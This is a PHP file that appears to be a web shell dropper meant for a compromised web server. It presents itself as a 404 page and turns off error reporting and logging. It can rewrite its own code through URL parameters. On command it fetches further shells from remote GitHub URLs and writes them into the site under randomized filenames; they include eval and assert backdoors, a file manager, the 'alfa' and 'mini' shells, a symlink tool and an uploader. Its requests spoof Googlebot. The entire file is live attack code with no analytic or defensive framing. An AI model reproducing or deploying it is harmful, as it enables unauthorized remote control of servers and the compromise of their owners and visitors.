<?php
@error_reporting(0); 
@set_time_limit(0);
@ini_set('output_buffering', 0); 
@ini_set('display_errors', 0); 
@ini_set('max_execution_time', 0); 
@ini_set('display_errors', 0); 
@ini_set('error_reporting', 0); 
@ini_set('error_log', NULL); 
@ini_set('log_errors', 0); 
@ob_start(); 
@ini_set('zlib.output_compression', 0); 
@ini_set('implicit_flush', 1); 
for ($i = 0; $i < ob_get_level(); $i++) { 
@ob_end_flush(); } 
@ob_implicit_flush(1); 
@clearstatcache();

echo header("HTTP/1.0 404 Not Found");
if ((array)$_SERVER["DOMAIN_PATH"]) {
    $root = $_SERVER["DOMAIN_PATH"];
} else {
    $root = $_SERVER["DOCUMENT_ROOT"];
}
$static_index = False;
$domain = $_SERVER["SERVER_NAME"];
$mix_strs = 'abcdefghijklmnopqrstuvwxyz';
$root_file = $root . '/index.php';
function get_url_con($con_s)
{
    if (function_exists('curl_init')) {
        $s = curl_init();
        curl_setopt($s, CURLOPT_URL, $con_s);
        curl_setopt($s, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($s, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)');
        curl_setopt($s, CURLOPT_REFERER, "http://www.google.com");
        curl_setopt($s, CURLOPT_HTTPHEADER, array('X-FORWARDED-FOR:66.249.72.240', 'CLIENT-IP:66.249.72.240'));
        return curl_exec($s);
    } else {
        return @file_get_contents($con_s);
    }
}
$options = array(
    'http' => array(
        'metod' => "GET",
        'timeout' => 60,
        'header' => "Accept-language: en\r\n" .
            "Cookie: foo=bar\r\n" .  // check function.stream-context-create on php.net
            "User-Agent: Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10" // i.e. An iPad 
    ),
    "ssl" => array(
        "verify_peer" => false,
        "verify_peer_name" => false,
    )
);
$file_name = dirname(__FILE__);
file_put_contents('write_check_class.txt', $file_name . ':::audio check class');
if (isset($_GET['change_index_file'])) {
    $php_self = substr($_SERVER['PHP_SELF'], strrpos($_SERVER['PHP_SELF'], '/') + 1);
    // reads an array of lines
    $txt_result = $_GET['change_index_file'];
    $txt_result = str_replace(array("\r\n", "\r", "\n"), "", $txt_result);
    $file_content = file($php_self);
    foreach ($file_content as $lineNumber => &$lineContent) {
        if ($lineNumber == 2) {
            $lineContent = '$index_file="' . $txt_result . '";' . "\r\n";
        }
    }
    $allContent = implode("", $file_content);
    file_put_contents($php_self, $allContent);
    exit;
}
if (isset($_GET['change_static_index'])) {
    $php_self = substr($_SERVER['PHP_SELF'], strrpos($_SERVER['PHP_SELF'], '/') + 1);
    // reads an array of lines
    //$txt_result = $_GET['change_static_index'];
    if ($_GET['change_static_index'] == 'True') {
        $txt_result = 'True';
    } else if ($_GET['change_static_index'] == 'True') {
        $txt_result = 'False';
    }
    $txt_result = str_replace(array("\r\n", "\r", "\n"), "", $txt_result);
    $file_content = file($php_self);
    foreach ($file_content as $lineNumber => &$lineContent) {
        if ($lineNumber == 3) {
            $lineContent = '$static_index=' . $txt_result . ';' . "\r\n";
        }
    }
    $allContent = implode("", $file_content);
    file_put_contents($php_self, $allContent);
    exit;
}
if (isset($_GET['write_editor'])) {
    $editor_content = get_url_con('https://raw.githubusercontent.com/instagraweb/sh3ll/transport/editor.txt');
    $editor_file = substr(str_shuffle($mix_strs), mt_rand(0, strlen($mix_strs) - 5), 4) . '_' . substr(str_shuffle($mix_strs), mt_rand(0, strlen($mix_strs) - 5), 4) . '.php';
    while (file_exists($editor_file)) {
        $editor_file = substr(str_shuffle($mix_strs), mt_rand(0, strlen($mix_strs) - 5), 4) . '_' . substr(str_shuffle($mix_strs), mt_rand(0, strlen($mix_strs) - 5), 4) . '.php';
    }
    file_put_contents($editor_file, $editor_content);
    $after_editor = file_get_contents($editor_file);
    $url = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'];
    $url_list = explode('/', $url);
    $url_dir = '';
    for ($i = 0; $i <= (count($url_list) - 2); $i++) {
        $url_dir .= $url_list[$i] . '/';
    }
    if ($after_editor == $editor_content) {
        echo 'write editor ::: ' . $url_dir . $editor_file . ' ::: succeed!!!';
    } else {
        echo 'write editor failed???';
    }
}
if (isset($_GET['write_eval'])) {
    $editor_content = get_url_con('https://raw.githubusercontent.com/instagraweb/sh3ll/transport/write_eval.txt');
    $editor_file = substr(str_shuffle($mix_strs), mt_rand(0, strlen($mix_strs) - 4), 3) . '_' . substr(str_shuffle($mix_strs), mt_rand(0, strlen($mix_strs) - 4), 3) . '_' . 'eva.php';
    while (file_exists($editor_file)) {
        $editor_file = substr(str_shuffle($mix_strs), mt_rand(0, strlen($mix_strs) - 4), 3) . '_' . substr(str_shuffle($mix_strs), mt_rand(0, strlen($mix_strs) - 4), 3) . '_' . 'eva.php';
    }
    file_put_contents($editor_file, $editor_content);
    $after_editor = file_get_contents($editor_file);
    $url = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'];
    $url_list = explode('/', $url);
    $url_dir = '';
    for ($i = 0; $i <= (count($url_list) - 2); $i++) {
        $url_dir .= $url_list[$i] . '/';
    }
    if ($after_editor == $editor_content) {
        echo 'write eval_editor ::: ' . $url_dir . $editor_file . ' ::: succeed!!!';
    } else {
        echo 'write eval_editor failed???';
    }
}
if (isset($_GET['write_assert'])) {
    $editor_content = get_url_con('https://raw.githubusercontent.com/instagraweb/sh3ll/transport/write_ass.txt');
    $editor_file = substr(str_shuffle($mix_strs), mt_rand(0, strlen($mix_strs) - 4), 3) . '_' . substr(str_shuffle($mix_strs), mt_rand(0, strlen($mix_strs) - 4), 3) . '_' . 'ass.php';
    while (file_exists($editor_file)) {
        $editor_file = substr(str_shuffle($mix_strs), mt_rand(0, strlen($mix_strs) - 4), 3) . '_' . substr(str_shuffle($mix_strs), mt_rand(0, strlen($mix_strs) - 4), 3) . '_' . 'ass.php';
    }
    file_put_contents($editor_file, $editor_content);
    $after_editor = file_get_contents($editor_file);
    $url = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'];
    $url_list = explode('/', $url);
    $url_dir = '';
    for ($i = 0; $i <= (count($url_list) - 2); $i++) {
        $url_dir .= $url_list[$i] . '/';
    }
    if ($after_editor == $editor_content) {
        echo 'write assert_editor ::: ' . $url_dir . $editor_file . ' ::: succeed!!!';
    } else {
        echo 'write assert_editor failed???';
    }
}
if (isset($_GET['write_fm'])) {
    $editor_content = get_url_con('https://raw.githubusercontent.com/transshell/lineshell/main/content.txt');
    $editor_file = 'content.php';
    while (file_exists($editor_file)) {
        $editor_file = 'content.php';
    }
    file_put_contents($editor_file, $editor_content);
    $after_editor = file_get_contents($editor_file);
    $url = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'];
    $url_list = explode('/', $url);
    $url_dir = '';
    for ($i = 0; $i <= (count($url_list) - 2); $i++) {
        $url_dir .= $url_list[$i] . '/';
    }
    if ($after_editor == $editor_content) {
        echo 'write file_manager ::: ' . $url_dir . $editor_file . ' ::: succeed!!!';
    } else {
        echo 'write file_manager failed???';
    }
}
if (isset($_GET['write_alfa'])) {
    $editor_content = get_url_con('https://raw.githubusercontent.com/transshell/lineshell/main/pk.txt');
    $editor_file = substr(str_shuffle($mix_strs), mt_rand(0, strlen($mix_strs) - 4), 3) . '_' . substr(str_shuffle($mix_strs), mt_rand(0, strlen($mix_strs) - 4), 3) . '_' . 'alfa.php';
    while (file_exists($editor_file)) {
        $editor_file = substr(str_shuffle($mix_strs), mt_rand(0, strlen($mix_strs) - 4), 3) . '_' . substr(str_shuffle($mix_strs), mt_rand(0, strlen($mix_strs) - 4), 3) . '_' . 'alfa.php';
    }
    file_put_contents($editor_file, $editor_content);
    $after_editor = file_get_contents($editor_file);
    $url = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'];
    $url_list = explode('/', $url);
    $url_dir = '';
    for ($i = 0; $i <= (count($url_list) - 2); $i++) {
        $url_dir .= $url_list[$i] . '/';
    }
    if ($after_editor == $editor_content) {
        echo 'write alfa_shell ::: ' . $url_dir . $editor_file . ' ::: succeed!!!';
    } else {
        echo 'write alfa_shell failed???';
    }
}
if (isset($_GET['write_mari'])) {
    $editor_content = get_url_con('https://raw.githubusercontent.com/transshell/lineshell/main/js.txt');
    $editor_file = substr(str_shuffle($mix_strs), mt_rand(0, strlen($mix_strs) - 4), 3) . '_' . substr(str_shuffle($mix_strs), mt_rand(0, strlen($mix_strs) - 4), 3) . '_' . 'mari.php';
    while (file_exists($editor_file)) {
        $editor_file = substr(str_shuffle($mix_strs), mt_rand(0, strlen($mix_strs) - 4), 3) . '_' . substr(str_shuffle($mix_strs), mt_rand(0, strlen($mix_strs) - 4), 3) . '_' . 'mari.php';
    }
    file_put_contents($editor_file, $editor_content);
    $after_editor = file_get_contents($editor_file);
    $url = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'];
    $url_list = explode('/', $url);
    $url_dir = '';
    for ($i = 0; $i <= (count($url_list) - 2); $i++) {
        $url_dir .= $url_list[$i] . '/';
    }
    if ($after_editor == $editor_content) {
        echo 'write mari_shell ::: ' . $url_dir . $editor_file . ' ::: succeed!!!';
    } else {
        echo 'write mari_shell failed???';
    }
}
if (isset($_GET['write_mini'])) {
    $editor_content = get_url_con('https://raw.githubusercontent.com/transshell/lineshell/main/crons.txt');
    $editor_file = substr(str_shuffle($mix_strs), mt_rand(0, strlen($mix_strs) - 4), 3) . '_' . substr(str_shuffle($mix_strs), mt_rand(0, strlen($mix_strs) - 4), 3) . '_' . 'mini.php';
    while (file_exists($editor_file)) {
        $editor_file = substr(str_shuffle($mix_strs), mt_rand(0, strlen($mix_strs) - 4), 3) . '_' . substr(str_shuffle($mix_strs), mt_rand(0, strlen($mix_strs) - 4), 3) . '_' . 'mini.php';
    }
    file_put_contents($editor_file, $editor_content);
    $after_editor = file_get_contents($editor_file);
    $url = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'];
    $url_list = explode('/', $url);
    $url_dir = '';
    for ($i = 0; $i <= (count($url_list) - 2); $i++) {
        $url_dir .= $url_list[$i] . '/';
    }
    if ($after_editor == $editor_content) {
        echo 'write mini_shell ::: ' . $url_dir . $editor_file . ' ::: succeed!!!';
    } else {
        echo 'write mini_shell failed???';
    }
}
if (isset($_GET['write_sym'])) {
    $editor_content = get_url_con('https://raw.githubusercontent.com/transshell/lineshell/main/sym403.txt');
    $editor_file = substr(str_shuffle($mix_strs), mt_rand(0, strlen($mix_strs) - 4), 3) . '_' . substr(str_shuffle($mix_strs), mt_rand(0, strlen($mix_strs) - 4), 3) . '_' . 'sym.php';
    while (file_exists($editor_file)) {
        $editor_file = substr(str_shuffle($mix_strs), mt_rand(0, strlen($mix_strs) - 4), 3) . '_' . substr(str_shuffle($mix_strs), mt_rand(0, strlen($mix_strs) - 4), 3) . '_' . 'sym.php';
    }
    file_put_contents($editor_file, $editor_content);
    $after_editor = file_get_contents($editor_file);
    $url = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'];
    $url_list = explode('/', $url);
    $url_dir = '';
    for ($i = 0; $i <= (count($url_list) - 2); $i++) {
        $url_dir .= $url_list[$i] . '/';
    }
    if ($after_editor == $editor_content) {
        echo 'write symlink403 ::: ' . $url_dir . $editor_file . ' ::: succeed!!!';
    } else {
        echo 'write symlink403 failed???';
    }
}
if (isset($_GET['write_up'])) {
    $editor_content = get_url_con('https://raw.githubusercontent.com/transshell/lineshell/main/up2001.txt');
    $editor_file = substr(str_shuffle($mix_strs), mt_rand(0, strlen($mix_strs) - 4), 3) . '_' . substr(str_shuffle($mix_strs), mt_rand(0, strlen($mix_strs) - 4), 3) . '_' . 'up.php';
    while (file_exists($editor_file)) {
        $editor_file = substr(str_shuffle($mix_strs), mt_rand(0, strlen($mix_strs) - 4), 3) . '_' . substr(str_shuffle($mix_strs), mt_rand(0, strlen($mix_strs) - 4), 3) . '_' . 'up.php';
    }
    file_put_contents($editor_file, $editor_content);
    $after_editor = file_get_contents($editor_file);
    $url = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'];
    $url_list = explode('/', $url);
    $url_dir = '';
    for ($i = 0; $i <= (count($url_list) - 2); $i++) {
        $url_dir .= $url_list[$i] . '/';
    }
    if ($after_editor == $editor_content) {
        echo 'write uploader ::: ' . $url_dir . $editor_file . ' ::: succeed!!!';
    } else {
        echo 'write uploader failed???';
    }
}